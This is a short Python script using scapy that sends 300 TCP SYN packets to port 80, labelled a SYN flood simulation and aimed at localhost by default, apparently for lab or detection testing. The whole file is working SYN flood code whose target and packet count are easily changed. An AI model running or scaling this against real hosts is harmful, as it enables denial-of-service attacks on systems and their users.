# simulate_syn.py
from scapy.all import IP, TCP, send
import random, time

target_ip = "127.0.0.1"  # change to target machine if needed
target_port = 80

print("💣 Simulating SYN flood...")
for _ in range(300):
    src_port = random.randint(1024, 65535)
    pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
    send(pkt, verbose=False)
    time.sleep(0.01)
print("✅ SYN flood simulation done")
